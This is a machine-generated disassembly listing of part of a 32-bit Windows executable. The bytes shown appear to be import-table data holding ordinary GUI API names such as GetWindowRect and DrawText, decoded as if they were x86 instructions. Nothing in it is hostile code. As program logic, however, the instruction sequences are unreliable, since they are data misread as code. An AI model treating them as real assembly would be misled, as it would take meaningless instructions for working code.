  428780:	and    cl,BYTE PTR [edi-0x70c7fffe]
  428786:	add    al,BYTE PTR [eax]
  428788:	push   esp
  428789:	pop    DWORD PTR [edx]
  42878b:	add    BYTE PTR [edx-0x71],ah
  42878e:	add    al,BYTE PTR [eax]
  428790:	je     0x428721
  428792:	add    al,BYTE PTR [eax]
  428794:	mov    BYTE PTR [edi-0x7061fffe],cl
  42879a:	add    al,BYTE PTR [eax]
  42879c:	mov    ah,0x8f
  42879e:	add    al,BYTE PTR [eax]
  4287a0:	retf   0x28f
  4287a3:	add    al,bl
  4287a5:	pop    DWORD PTR [edx]
  4287a7:	add    ah,ch
  4287a9:	pop    DWORD PTR [edx]
  4287ab:	add    ah,bh
  4287ad:	pop    DWORD PTR [edx]
  4287af:	add    BYTE PTR [eax],cl
  4287b1:	nop
  4287b2:	add    al,BYTE PTR [eax]
  4287b4:	sbb    dl,BYTE PTR [eax-0x6fd5fffe]
  4287ba:	add    al,BYTE PTR [eax]
  4287bc:	cmp    al,0x90
  4287be:	add    al,BYTE PTR [eax]
  4287c0:	dec    edx
  4287c1:	nop
  4287c2:	add    al,BYTE PTR [eax]
  4287c4:	pop    esp
  4287c5:	nop
  4287c6:	add    al,BYTE PTR [eax]
  4287c8:	jb     0x42875a
  4287ca:	add    al,BYTE PTR [eax]
  4287cc:	mov    ss,WORD PTR [eax-0x6f5bfffe]
  4287d2:	add    al,BYTE PTR [eax]
  4287d4:	mov    dh,0x90
  4287d6:	add    al,BYTE PTR [eax]
  4287d8:	enter  0x290,0x0
  4287dc:	ficom  DWORD PTR [eax-0x6f11fffe]
  4287e2:	add    al,BYTE PTR [eax]
  4287e4:	cld    
  4287e5:	nop
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	or     al,0x91
  4287ea:	add    al,BYTE PTR [eax]
  4287ec:	sbb    BYTE PTR [ecx-0x6ed9fffe],dl
  4287f2:	add    al,BYTE PTR [eax]
  4287f4:	ds xchg ecx,eax
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	dec    esi
  4287f9:	xchg   ecx,eax
  4287fa:	add    al,BYTE PTR [eax]
  4287fc:	pop    esp
  4287fd:	xchg   ecx,eax
  4287fe:	add    al,BYTE PTR [eax]
  428800:	jo     0x428793
  428802:	add    al,BYTE PTR [eax]
  428804:	jle    0x428797
  428806:	add    al,BYTE PTR [eax]
  428808:	mov    dl,BYTE PTR [ecx-0x6e63fffe]
  42880e:	add    al,BYTE PTR [eax]
  428810:	scas   al,BYTE PTR es:[edi]
  428811:	xchg   ecx,eax
  428812:	add    al,BYTE PTR [eax]
  428814:	rcl    BYTE PTR [ecx-0x6e29fffe],0x2
  42881b:	add    dl,ah
  42881d:	xchg   ecx,eax
  42881e:	add    al,BYTE PTR [eax]
  428820:	lock xchg ecx,eax
  428822:	add    al,BYTE PTR [eax]
  428824:	cld    
  428825:	xchg   ecx,eax
  428826:	add    al,BYTE PTR [eax]
  428828:	or     dl,BYTE PTR [edx-0x6de1fffe]
  42882e:	add    al,BYTE PTR [eax]
  428830:	sub    dl,BYTE PTR [edx-0x6dc1fffe]
  428836:	add    al,BYTE PTR [eax]
  428838:	dec    edx
  428839:	xchg   edx,eax
  42883a:	add    al,BYTE PTR [eax]
  42883c:	pop    edx
  42883d:	xchg   edx,eax
  42883e:	add    al,BYTE PTR [eax]
  428840:	push   0x7e000292
  428845:	xchg   edx,eax
  428846:	add    al,BYTE PTR [eax]
  428848:	add    BYTE PTR [eax],al
  42884a:	add    BYTE PTR [eax],al
  42884c:	xchg   esi,eax
  42884d:	xchg   edx,eax
  42884e:	add    al,BYTE PTR [eax]
  428850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428851:	xchg   edx,eax
  428852:	add    al,BYTE PTR [eax]
  428854:	mov    dh,0x92
  428856:	add    al,BYTE PTR [eax]
  428858:	into   
  428859:	xchg   edx,eax
  42885a:	add    al,BYTE PTR [eax]
  42885c:	loopne 0x4287f0
  42885e:	add    al,BYTE PTR [eax]
  428860:	repnz xchg edx,eax
  428862:	add    al,BYTE PTR [eax]
  428864:	or     al,0x93
  428866:	add    al,BYTE PTR [eax]
  428868:	sbb    al,0x93
  42886a:	add    al,BYTE PTR [eax]
  42886c:	es xchg ebx,eax
  42886e:	add    al,BYTE PTR [eax]
  428870:	cmp    BYTE PTR [ebx-0x6cb7fffe],dl
  428876:	add    al,BYTE PTR [eax]
  428878:	pusha  
  428879:	xchg   ebx,eax
  42887a:	add    al,BYTE PTR [eax]
  42887c:	jo     0x428811
  42887e:	add    al,BYTE PTR [eax]
  428880:	adc    BYTE PTR [ebx-0x6c6dfffe],0x2
  428887:	add    BYTE PTR [ebx+edx*4-0x6c4ffffe],ah
  42888e:	add    al,BYTE PTR [eax]
  428890:	mov    esp,0xd2000293
  428895:	xchg   ebx,eax
  428896:	add    al,BYTE PTR [eax]
  428898:	out    0x93,al
  42889a:	add    al,BYTE PTR [eax]
  42889c:	cld    
  42889d:	xchg   ebx,eax
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	adc    BYTE PTR [edx+eax*1+0x2942600],dl
  4288a7:	add    BYTE PTR [eax],bh
  4288a9:	xchg   esp,eax
  4288aa:	add    al,BYTE PTR [eax]
  4288ac:	inc    esp
  4288ad:	xchg   esp,eax
  4288ae:	add    al,BYTE PTR [eax]
  4288b0:	push   esp
  4288b1:	xchg   esp,eax
  4288b2:	add    al,BYTE PTR [eax]
  4288b4:	jb     0x42884a
  4288b6:	add    al,BYTE PTR [eax]
  4288b8:	mov    WORD PTR [edx+eax*1+0x2949a00],ss
  4288bf:	add    BYTE PTR [esi-0x39fffd6c],ch
  4288c5:	xchg   esp,eax
  4288c6:	add    al,BYTE PTR [eax]
  4288c8:	ficom  DWORD PTR [edx+eax*1+0x294ea00]
  4288cf:	add    BYTE PTR [eax],al
  4288d1:	xchg   ebp,eax
  4288d2:	add    al,BYTE PTR [eax]
  4288d4:	adc    dl,BYTE PTR [ebp-0x6adffffe]
  4288da:	add    al,BYTE PTR [eax]
  4288dc:	xor    dl,BYTE PTR [ebp-0x6abffffe]
  4288e2:	add    al,BYTE PTR [eax]
  4288e4:	push   eax
  4288e5:	xchg   ebp,eax
  4288e6:	add    al,BYTE PTR [eax]
  4288e8:	xchg   bp,ax
  4288ea:	add    al,BYTE PTR [eax]
  4288ec:	jl     0x428883
  4288ee:	add    al,BYTE PTR [eax]
  4288f0:	mov    WORD PTR [ebp-0x6a5dfffe],ss
  4288f6:	add    al,BYTE PTR [eax]
  4288f8:	lods   al,BYTE PTR ds:[esi]
  4288f9:	xchg   ebp,eax
  4288fa:	add    al,BYTE PTR [eax]
  4288fc:	mov    esi,0xce000295
  428901:	xchg   ebp,eax
  428902:	add    al,BYTE PTR [eax]
  428904:	fcom   QWORD PTR [ebp-0x6a0dfffe]
  42890a:	add    al,BYTE PTR [eax]
  42890c:	add    BYTE PTR [eax],al
  42890e:	add    BYTE PTR [eax],al
  428910:	xchg   edx,eax
  428911:	add    edx,DWORD PTR [edx+0x74]
  428914:	ins    BYTE PTR es:[edi],dx
  428915:	dec    ecx
  428916:	outs   dx,BYTE PTR ds:[esi]
  428917:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  42891f:	jb     0x42898a
  428921:	outs   dx,BYTE PTR ds:[esi]
  428922:	add    BYTE PTR [bp+0x74],ch
  428926:	fs ins BYTE PTR es:[edi],dx
  428928:	ins    BYTE PTR es:[edi],dx
  428929:	cs fs ins BYTE PTR es:[edi],dx
  42892c:	ins    BYTE PTR es:[edi],dx
  42892d:	add    BYTE PTR [ecx+0x74654701],dl
  428933:	push   esi
  428934:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  42893b:	dec    edi
  42893c:	jb     0x4289a5
  42893e:	inc    ebp
  42893f:	js     0x428941
  428941:	add    BYTE PTR [edx+0x74654701],cl
  428947:	push   esp
  428948:	gs js  0x4289bf
  42894b:	inc    ebp
  42894c:	js     0x4289c2
  42894e:	outs   dx,BYTE PTR gs:[esi]
  428950:	je     0x4289a2
  428952:	outs   dx,DWORD PTR ds:[esi]
  428953:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  42895a:	push   ebx
  42895b:	gs je  0x4289b2
  42895e:	gs js  0x4289d5
  428961:	inc    ecx
  428962:	ins    BYTE PTR es:[edi],dx
  428963:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42896a:	inc    ebp
  42896b:	js     0x4289e1
  42896d:	push   esp
  42896e:	gs js  0x4289e5
  428971:	dec    edi
  428972:	jne    0x4289e8
  428974:	push   edi
  428975:	add    BYTE PTR [eax],dl
  428977:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42897b:	outs   dx,BYTE PTR ds:[esi]
  42897c:	jae    0x4289ea
  42897e:	popa   
  42897f:	je     0x4289e6
  428981:	inc    ebx
  428982:	push   0x65737261
  428987:	je     0x4289d2
  428989:	outs   dx,BYTE PTR ds:[esi]
  42898a:	outs   dx,WORD PTR ds:[esi]
  42898c:	add    BYTE PTR [eax],al
  42898e:	pop    ss
  42898f:	add    dl,BYTE PTR [edi+0x69]
  428992:	fs outs dx,BYTE PTR gs:[esi]
  428995:	push   eax
  428996:	popa   
  428997:	je     0x428a01
  428999:	add    BYTE PTR [ebp+0x65724300],cl
  42899f:	popa   
  4289a0:	je     0x428a07
  4289a2:	inc    ebx
  4289a3:	outs   dx,DWORD PTR ds:[esi]
  4289a4:	ins    DWORD PTR es:[edi],dx
  4289a5:	jo     0x428a08
  4289a7:	je     0x428a12
  4289a9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  4289ad:	inc    ebx
  4289ae:	add    BYTE PTR [eax],al
  4289b0:	mov    bh,0x1
  4289b2:	push   eax
  4289b3:	outs   dx,DWORD PTR ds:[esi]
  4289b4:	ins    BYTE PTR es:[edi],dx
  4289b5:	jns    0x428a23
  4289b7:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  4289be:	inc    edi
  4289bf:	gs je  0x428a19
  4289c2:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4289c9:	addr16 inc ebp
  4289cb:	js     0x4289cd
  4289cd:	add    cl,ch
  4289cf:	add    DWORD PTR [ebx+0x65],edx
  4289d2:	je     0x428a20
  4289d4:	popa   
  4289d5:	jns    0x428a46
  4289d7:	jne    0x428a4d
  4289d9:	add    bl,dl
  4289db:	add    DWORD PTR [ebx+0x65],edx
  4289de:	je     0x428a21
  4289e0:	bound  ebp,QWORD PTR [edi+0x72]
  4289e3:	je     0x428a35
  4289e5:	jb     0x428a56
  4289e7:	arpl   WORD PTR [eax],ax
  4289e9:	add    BYTE PTR [edx],cl
  4289eb:	add    dl,BYTE PTR [ebx+0x74]
  4289ee:	jb     0x428a55
  4289f0:	je     0x428a55
  4289f2:	push   0x69424944
  4289f7:	je     0x428a6c
  4289f9:	add    BYTE PTR [ebx+0x1],al
  4289fc:	inc    edi
  4289fd:	gs je  0x428a44
  428a00:	dec    ecx
  428a01:	inc    edx
  428a02:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  428a0a:	je     0x428a59
  428a0c:	popa   
  428a0d:	jo     0x428a5c
  428a0f:	outs   dx,DWORD PTR ds:[esi]
  428a10:	fs add BYTE PTR gs:[eax],al
  428a14:	daa    
  428a15:	add    DWORD PTR [edi+0x65],eax
  428a18:	je     0x428a5c
  428a1a:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  428a1e:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  428a25:	jae    0x428a8c
  428a27:	je     0x428a7b
  428a29:	outs   dx,BYTE PTR ds:[si]
  428a2b:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  428a32:	jo     0x428aa7
  428a34:	gs add ah,cl
  428a37:	add    DWORD PTR [ebx+0x63],edx
  428a3a:	popa   
  428a3b:	ins    BYTE PTR es:[edi],dx
  428a3c:	gs push edi
  428a3e:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428a45:	je     0x428a8c
  428a47:	js     0x428a49
  428a49:	add    BYTE PTR [edx+0x1],bh
  428a4c:	inc    edi
  428a4d:	gs je  0x428aa3
  428a50:	je     0x428ac1
  428a52:	arpl   WORD PTR [ebx+0x4f],bp
  428a55:	bound  ebp,QWORD PTR [edx+0x65]
  428a58:	arpl   WORD PTR [eax+eax*1+0x0],si
  428a5c:	call   0x5465:0x6e694c01
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	add    BYTE PTR [eax],al
  428a66:	mov    dh,0x1
  428a68:	push   eax
  428a69:	outs   dx,DWORD PTR ds:[esi]
  428a6a:	ins    BYTE PTR es:[edi],dx
  428a6b:	jns    0x428ad4
  428a6d:	outs   dx,DWORD PTR ds:[esi]
  428a6e:	outs   dx,BYTE PTR ds:[esi]
  428a6f:	add    BYTE PTR [esi+0x1],bh
  428a72:	inc    edi
  428a73:	gs je  0x428aca
  428a76:	gs js  0x428aed
  428a79:	inc    ecx
  428a7a:	ins    BYTE PTR es:[edi],dx
  428a7b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428a82:	inc    edi
  428a83:	gs je  0x428ada
  428a86:	gs js  0x428afd
  428a89:	inc    esi
  428a8a:	popa   
  428a8b:	arpl   WORD PTR [ebp+0x57],sp
  428a8e:	add    BYTE PTR [eax],al
  428a90:	mov    ebx,0x61655201
  428a95:	ins    BYTE PTR es:[edi],dx
  428a96:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428a9d:	je     0x428b13
  428a9f:	add    BYTE PTR gs:[eax],al
  428aa2:	mov    DWORD PTR [ecx],0x69736552
  428aa8:	jp     0x428b0f
  428aaa:	push   eax
  428aab:	popa   
  428aac:	ins    BYTE PTR es:[edi],dx
  428aad:	gs je  0x428b24
  428ab0:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428ab7:	bound  ebp,QWORD PTR [ecx+0x6e]
  428aba:	gs push edx
  428abc:	outs   dx,BYTE PTR ds:[si]
  428abe:	add    BYTE PTR [eax],al
  428ac0:	push   cs
  428ac1:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428ac5:	je     0x428b16
  428ac7:	jne    0x428b3d
  428ac9:	inc    ecx
  428aca:	add    BYTE PTR [eax],al
  428acc:	test   DWORD PTR [ecx],0x52746553
  428ad2:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ad7:	outs   dx,BYTE PTR ds:[esi]
  428ad8:	add    BYTE PTR [eax],al
  428ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428adb:	add    BYTE PTR [ebx+0x72],al
  428ade:	gs popa 
  428ae0:	je     0x428b47
  428ae2:	push   eax
  428ae3:	popa   
  428ae4:	ins    BYTE PTR es:[edi],dx
  428ae5:	gs je  0x428b5c
  428ae8:	add    BYTE PTR gs:[ecx+eax*1],ah
  428aec:	inc    edi
  428aed:	gs je  0x428b32
  428af0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428af8:	jae    0x428afa
  428afa:	mov    DWORD PTR [eax],0x6d756e45
  428b00:	inc    esi
  428b01:	outs   dx,DWORD PTR ds:[esi]
  428b02:	outs   dx,BYTE PTR ds:[esi]
  428b03:	je     0x428b78
  428b05:	push   edi
  428b06:	add    BYTE PTR [eax],al
  428b08:	lods   al,BYTE PTR ds:[esi]
  428b09:	add    BYTE PTR [ebx+0x72],al
  428b0c:	gs popa 
  428b0e:	je     0x428b75
  428b10:	push   edx
  428b11:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b16:	outs   dx,BYTE PTR ds:[esi]
  428b17:	dec    ecx
  428b18:	outs   dx,BYTE PTR ds:[esi]
  428b19:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428b21:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428b25:	gs inc esp
  428b27:	inc    esp
  428b28:	inc    ecx
  428b29:	add    ch,dl
  428b2b:	add    DWORD PTR [ebx+0x65],edx
  428b2e:	je     0x428b72
  428b30:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428b38:	jae    0x428b3a
  428b3a:	mov    BYTE PTR [eax],al
  428b3c:	inc    ebx
  428b3d:	jb     0x428ba4
  428b3f:	popa   
  428b40:	je     0x428ba7
  428b42:	inc    edx
  428b43:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428b4b:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428b52:	mov    es,WORD PTR [ecx]
  428b54:	inc    edi
  428b55:	gs je  0x428bac
  428b58:	gs js  0x428bcf
  428b5b:	dec    ebp
  428b5c:	gs je  0x428bd1
  428b5f:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b66:	push   ebx
  428b67:	gs je  0x428bac
  428b6a:	jb     0x428be1
  428b6c:	jae    0x428bd6
  428b6e:	dec    edi
  428b6f:	jb     0x428bd8
  428b71:	inc    ebp
  428b72:	js     0x428b74
  428b74:	mov    esp,0x63655201
  428b79:	je     0x428bc4
  428b7b:	outs   dx,BYTE PTR ds:[esi]
  428b7c:	push   edx
  428b7d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428b86:	inc    ebp
  428b87:	jae    0x428bec
  428b89:	popa   
  428b8a:	jo     0x428bf1
  428b8c:	add    BYTE PTR [eax],al
  428b8e:	scas   eax,DWORD PTR es:[edi]
  428b8f:	add    DWORD PTR [eax+0x6f],edx
  428b92:	ins    BYTE PTR es:[edi],dx
  428b93:	jns    0x428bd7
  428b95:	gs jp  0x428c01
  428b98:	gs jb  0x428b9b
  428b9b:	add    BYTE PTR [ebx+0x65724300],ch
  428ba1:	popa   
  428ba2:	je     0x428c09
  428ba4:	push   edx
  428ba5:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428baa:	outs   dx,BYTE PTR ds:[esi]
  428bab:	add    BYTE PTR [edi+0x65724300],cl
  428bb1:	popa   
  428bb2:	je     0x428c19
  428bb4:	inc    esp
  428bb5:	inc    ebx
  428bb6:	push   edi
  428bb7:	add    BYTE PTR ds:0x74654701,bh
  428bbd:	inc    ebx
  428bbe:	jne    0x428c32
  428bc0:	jb     0x428c27
  428bc2:	outs   dx,BYTE PTR ds:[esi]
  428bc3:	je     0x428c14
  428bc5:	bound  ebp,QWORD PTR [edx+0x65]
  428bc8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bcc:	inc    edi
  428bcd:	inc    esp
  428bce:	dec    ecx
  428bcf:	xor    esi,DWORD PTR [edx]
  428bd1:	cs fs ins BYTE PTR es:[edi],dx
  428bd4:	ins    BYTE PTR es:[edi],dx
  428bd5:	add    BYTE PTR [ebx+0x6f],ah
  428bd8:	outs   dx,BYTE PTR ds:[esi]
  428bd9:	jae    0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	gs cs fs ins BYTE PTR es:[edi],dx
  428be0:	ins    BYTE PTR es:[edi],dx
  428be1:	add    BYTE PTR [ecx],bh
  428be3:	add    BYTE PTR [ebx+0x68],al
  428be6:	popa   
  428be7:	jb     0x428c3e
  428be9:	jo     0x428c5b
  428beb:	gs jb  0x428c45
  428bee:	add    BYTE PTR [eax],al
  428bf0:	dec    esi
  428bf1:	add    dl,BYTE PTR [ebx+0x65]
  428bf4:	je     0x428c43
  428bf6:	outs   dx,BYTE PTR gs:[esi]
  428bf8:	jne    0x428c43
  428bfa:	je     0x428c61
  428bfc:	ins    DWORD PTR es:[edi],dx
  428bfd:	dec    ecx
  428bfe:	outs   dx,BYTE PTR ds:[esi]
  428bff:	outs   dx,WORD PTR ds:[esi]
  428c01:	push   edi
  428c02:	add    BYTE PTR [eax],al
  428c04:	scas   al,BYTE PTR es:[edi]
  428c05:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428c09:	fs inc ebx
  428c0b:	jne    0x428c7f
  428c0d:	jae    0x428c7e
  428c0f:	jb     0x428c68
  428c11:	add    BYTE PTR [eax+0x0],bl
  428c14:	inc    ebx
  428c15:	jb     0x428c7c
  428c17:	popa   
  428c18:	je     0x428c7f
  428c1a:	inc    esp
  428c1b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428c22:	jb     0x428c85
  428c24:	ins    DWORD PTR es:[edi],dx
  428c25:	inc    ecx
  428c26:	add    BYTE PTR [eax],al
  428c28:	popf   
  428c29:	add    DWORD PTR [ecx+0x73],ecx
  428c2c:	dec    ebp
  428c2d:	outs   dx,BYTE PTR gs:[esi]
  428c2f:	jne    0x428c31
  428c31:	add    BYTE PTR [eax+0x1],ch
  428c34:	inc    edi
  428c35:	gs je  0x428c8f
  428c38:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428c3f:	add    DWORD PTR [edi+0x65],eax
  428c42:	je     0x428c98
  428c44:	outs   dx,DWORD PTR ds:[esi]
  428c45:	jo     0x428c9e
  428c47:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428c4e:	mov    ds:0x57734901,eax
  428c53:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428c5a:	jae    0x428cc5
  428c5c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c60:	sub    eax,0x74654701
  428c65:	dec    ebp
  428c66:	outs   dx,BYTE PTR gs:[esi]
  428c68:	jne    0x428cad
  428c6a:	push   0x4d6b6365
  428c6f:	popa   
  428c70:	jb     0x428cdd
  428c72:	inc    esp
  428c73:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c7a:	outs   dx,BYTE PTR ds:[esi]
  428c7b:	jae    0x428c7d
  428c7d:	add    BYTE PTR [edx],bl
  428c7f:	add    BYTE PTR [ebx+0x61],al
  428c82:	ins    BYTE PTR es:[edi],dx
  428c83:	ins    BYTE PTR es:[edi],dx
  428c84:	push   edi
  428c85:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428c8c:	outs   dx,DWORD PTR ds:[esi]
  428c8d:	arpl   WORD PTR [ecx+0x0],ax
  428c90:	repz add BYTE PTR [edi+0x65],al
  428c94:	je     0x428cd9
  428c96:	popa   
  428c97:	jb     0x428cfe
  428c99:	je     0x428ceb
  428c9b:	outs   dx,DWORD PTR ds:[esi]
  428c9c:	jae    0x428c9e
  428c9e:	ret    0x7702
  428ca1:	jbe    0x428d16
  428ca3:	jo     0x428d17
  428ca5:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428cac:	test   al,0x1
  428cae:	dec    esp
  428caf:	outs   dx,DWORD PTR ds:[esi]
  428cb0:	popa   
  428cb1:	fs inc ecx
  428cb3:	arpl   WORD PTR [ebx+0x65],sp
  428cb6:	ins    BYTE PTR es:[edi],dx
  428cb7:	gs jb  0x428d1b
  428cba:	je     0x428d2b
  428cbc:	jb     0x428d31
  428cbe:	push   edi
  428cbf:	add    BYTE PTR [edi],cl
  428cc1:	add    BYTE PTR [edx+0x72],al
  428cc4:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428ccb:	outs   dx,DWORD PTR ds:[esi]
  428ccc:	ja     0x428d22
  428cce:	outs   dx,DWORD PTR ds:[esi]
  428ccf:	push   esp
  428cd0:	outs   dx,DWORD PTR ds:[esi]
  428cd1:	jo     0x428cd3
  428cd3:	add    BYTE PTR [ecx+0x66654400],cl
  428cd9:	inc    esi
  428cda:	jb     0x428d3d
  428cdc:	ins    DWORD PTR es:[edi],dx
  428cdd:	gs push eax
  428cdf:	jb     0x428d50
  428ce1:	arpl   WORD PTR [ecx+0x0],ax
  428ce4:	mov    ebx,0x61724400
  428ce9:	ja     0x428d3f
  428ceb:	gs js  0x428d62
  428cee:	inc    ebp
  428cef:	js     0x428d48
  428cf1:	add    BYTE PTR [edx+0x666e4901],al
  428cf7:	ins    BYTE PTR es:[edi],dx
  428cf8:	popa   
  428cf9:	je     0x428d60
  428cfb:	push   edx
  428cfc:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428d01:	add    dl,BYTE PTR [edx+0x65]
  428d04:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428d0c:	popa   
  428d0d:	jae    0x428d82
  428d0f:	push   edi
  428d10:	add    BYTE PTR [eax],al
  428d12:	inc    ebp
  428d13:	add    dl,BYTE PTR [ebx+0x65]
  428d16:	je     0x428d64
  428d18:	popa   
  428d19:	jae    0x428d8f
  428d1b:	inc    ebp
  428d1c:	jb     0x428d90
  428d1e:	outs   dx,DWORD PTR ds:[esi]
  428d1f:	jb     0x428d66
  428d21:	js     0x428d23
  428d23:	add    BYTE PTR [edx+0x43734901],dl
  428d29:	push   0x70557261
  428d2e:	jo     0x428d95
  428d30:	jb     0x428d73
  428d32:	add    BYTE PTR [eax],al
  428d34:	inc    ebx
  428d35:	add    BYTE PTR [ebx+0x6c],al
  428d38:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428d3f:	arpl   WORD PTR [edx+0x65],si
  428d42:	outs   dx,BYTE PTR gs:[esi]
  428d44:	add    BYTE PTR [eax],al
  428d46:	push   ecx
  428d47:	add    dl,BYTE PTR [ebx+0x65]
  428d4a:	je     0x428d9c
  428d4c:	popa   
  428d4d:	jb     0x428db4
  428d4f:	outs   dx,BYTE PTR ds:[esi]
  428d50:	je     0x428d52
  428d52:	xchg   ecx,eax
  428d53:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428d57:	arpl   WORD PTR [ebx+0x50],bp
  428d5a:	outs   dx,DWORD PTR ds:[esi]
  428d5b:	jo     0x428dd2
  428d5d:	jo     0x428dac
  428d5f:	outs   dx,BYTE PTR gs:[esi]
  428d61:	jne    0x428da8
  428d63:	js     0x428d65
  428d65:	add    BYTE PTR [edx],ah
  428d67:	add    DWORD PTR [edi+0x65],eax
  428d6a:	je     0x428db7
  428d6c:	gs jns 0x428dd1
  428d6f:	outs   dx,DWORD PTR ds:[esi]
  428d70:	popa   
  428d71:	jb     0x428dd7
  428d73:	dec    esp
  428d74:	popa   
  428d75:	jns    0x428de6
  428d77:	jne    0x428ded
  428d79:	add    bl,bh
  428d7b:	add    BYTE PTR [edi+0x65],al
  428d7e:	je     0x428dc3
  428d80:	ins    BYTE PTR es:[edi],dx
  428d81:	popa   
  428d82:	jae    0x428df7
  428d84:	dec    esi
  428d85:	popa   
  428d86:	ins    DWORD PTR es:[edi],dx
  428d87:	gs push edi
  428d89:	add    ch,bl
  428d8b:	add    BYTE PTR [ebp+0x71],al
  428d8e:	jne    0x428df1
  428d90:	ins    BYTE PTR es:[edi],dx
  428d91:	push   edx
  428d92:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428d97:	add    dl,BYTE PTR [ebx+0x65]
  428d9a:	je     0x428ddf
  428d9c:	popa   
  428d9d:	jb     0x428e04
  428d9f:	je     0x428df1
  428da1:	outs   dx,DWORD PTR ds:[esi]
  428da2:	jae    0x428da4
  428da4:	and    al,0x0
  428da6:	inc    ebx
  428da7:	push   0x65676e61
  428dac:	dec    ebp
  428dad:	outs   dx,BYTE PTR gs:[esi]
  428daf:	jne    0x428e08
  428db1:	add    BYTE PTR [eax+0x73654400],bl
  428db7:	je     0x428e2b
  428db9:	outs   dx,DWORD PTR ds:[esi]
  428dba:	jns    0x428e13
  428dbc:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428dc3:	add    DWORD PTR [eax+0x6f],edx
  428dc6:	jae    0x428e3c
  428dc8:	push   esp
  428dc9:	push   0x64616572
  428dce:	dec    ebp
  428dcf:	gs jae 0x428e45
  428dd2:	popa   
  428dd3:	addr16 gs push edi
  428dd6:	add    BYTE PTR [eax],al
  428dd8:	push   edi
  428dd9:	add    dl,BYTE PTR [ebx+0x65]
  428ddc:	je     0x428e2e
  428dde:	jb     0x428e4f
  428de0:	jo     0x428e39
  428de2:	add    BYTE PTR [eax],al
  428de4:	mov    al,0x1
  428de6:	dec    esp
  428de7:	outs   dx,DWORD PTR ds:[esi]
  428de8:	popa   
  428de9:	fs dec ecx
  428deb:	arpl   WORD PTR [edi+0x6e],bp
  428dee:	push   edi
  428def:	add    bl,bh
  428df1:	add    DWORD PTR [eax+0x74],edx
  428df4:	dec    ecx
  428df5:	outs   dx,BYTE PTR ds:[esi]
  428df6:	push   edx
  428df7:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428dfc:	dec    edx
  428dfd:	add    dl,BYTE PTR [ebx+0x65]
  428e00:	je     0x428e4f
  428e02:	outs   dx,BYTE PTR gs:[esi]
  428e04:	jne    0x428e4a
  428e06:	gs popaw 
  428e09:	jne    0x428e77
  428e0b:	je     0x428e56
  428e0d:	je     0x428e74
  428e0f:	ins    DWORD PTR es:[edi],dx
  428e10:	add    BYTE PTR [eax],al
  428e12:	sti    
  428e13:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428e17:	arpl   WORD PTR [ebx+0x50],bp
  428e1a:	outs   dx,DWORD PTR ds:[esi]
  428e1b:	jo     0x428e92
  428e1d:	jo     0x428e6c
  428e1f:	outs   dx,BYTE PTR gs:[esi]
  428e21:	jne    0x428e23
  428e23:	add    BYTE PTR [ebp+0x64705502],ah
  428e29:	popa   
  428e2a:	je     0x428e91
  428e2c:	push   edi
  428e2d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e34:	push   ss
  428e35:	add    dl,BYTE PTR [edx+0x65]
  428e38:	ins    DWORD PTR es:[edi],dx
  428e39:	outs   dx,DWORD PTR ds:[esi]
  428e3a:	jbe    0x428ea1
  428e3c:	dec    ebp
  428e3d:	outs   dx,BYTE PTR gs:[esi]
  428e3f:	jne    0x428e41
  428e41:	add    BYTE PTR [edx+0x61724400],dh
  428e47:	ja     0x428e8f
  428e49:	jb     0x428eac
  428e4b:	ins    DWORD PTR es:[edi],dx
  428e4c:	gs inc ebx
